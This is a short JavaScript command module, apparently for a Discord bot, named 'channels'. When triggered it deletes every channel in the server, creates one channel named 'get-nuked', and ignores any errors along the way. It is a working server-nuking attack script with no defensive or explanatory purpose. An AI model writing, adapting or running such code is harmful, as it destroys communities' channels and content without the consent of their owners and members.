module.exports = {
    name: "channels",
    secured: true,
    rateLimitTime: 12 * 1000,
    rateLimitUsage: 1,
    execute: async (message, args, client) => {
        message.guild.channels.cache.forEach(async channel => {
            await channel.delete().catch(e => { });
        });
        message.guild.channels.create({
            name: 'get-nuked'
        }).catch(e => { });
    },
};